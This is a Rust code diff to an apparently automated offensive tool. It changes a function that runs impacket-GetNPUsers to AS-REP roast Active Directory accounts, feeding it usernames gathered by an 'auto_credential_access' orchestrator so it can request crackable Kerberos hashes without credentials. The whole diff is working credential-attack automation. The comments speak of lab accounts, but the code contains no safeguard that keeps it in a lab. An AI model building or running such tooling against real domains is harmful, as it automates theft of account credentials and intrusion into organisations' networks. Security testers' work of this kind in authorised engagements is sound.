@@ -37,8 +37,43 @@ pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
     let username = optional_str(args, "username").unwrap_or("");
     let password = optional_str(args, "password").unwrap_or("");
     let users_file = optional_str(args, "users_file");
+    // Accept an inline username array via `known_users`. The orchestrator's
+    // auto_credential_access automation discovers users via LDAP-via-ticket
+    // and ACL enum, then injects them here so we don't have to re-enumerate
+    // (which fails on hardened/SID-filtered DCs anyway). Without this read
+    // the orchestrator's known_users was silently dropped and asrep_roast
+    // fell back to the generic seclists wordlist, missing lab-specific
+    // accounts like the ones we just enumerated.
+    let known_users: Vec<String> = args
+        .get("known_users")
+        .and_then(|v| v.as_array())
+        .map(|arr| {
+            arr.iter()
+                .filter_map(|x| x.as_str().map(str::to_string))
+                .filter(|s| !s.is_empty())
+                .collect()
+        })
+        .unwrap_or_default();
 
     let mut cmd = CommandBuilder::new("impacket-GetNPUsers");
+
+    // Materialize known_users (if any) to a temp file so we can pass it via
+    // -usersfile. The temp file persists until process exit — short-lived
+    // for AS-REP roast invocations.
+    let known_users_tmp: Option<String> = if !known_users.is_empty() {
+        let path = format!(
+            "/tmp/asrep_known_users_{}_{}.txt",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_nanos())
+                .unwrap_or(0)
+        );
+        std::fs::write(&path, known_users.join("\n"))?;
+        Some(path)
+    } else {
+        None
+    };
 
     if !username.is_empty() && !password.is_empty() {
         // Authenticated mode: LDAP user enumeration
@@ -48,6 +83,10 @@ pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
         // No-auth mode with explicit user file
         let target = format!("{domain}/");
         cmd = cmd.arg(&target).flag("-usersfile", uf).arg("-no-pass");
+    } else if let Some(ref path) = known_users_tmp {
+        // No-auth mode with orchestrator-supplied known_users array
+        let target = format!("{domain}/");
+        cmd = cmd.arg(&target).flag("-usersfile", path).arg("-no-pass");
     } else {
         // No-auth mode: use seclists if available, otherwise built-in AD usernames
         let target = format!("{domain}/");
@@ -65,11 +104,18 @@ pub async fn asrep_roast(args: &Value) -> Result<ToolOutput> {
         }
     }
 
-    cmd.flag("-dc-ip", dc_ip)
+    let result = cmd
+        .flag("-dc-ip", dc_ip)
         .arg("-request")
         .timeout_secs(120)
         .execute()
-        .await
+        .await;
+
+    if let Some(path) = known_users_tmp {
+        let _ = std::fs::remove_file(&path);
+    }
+
+    result
 }
 
 /// Common AD usernames for unauthenticated Kerberos enumeration.
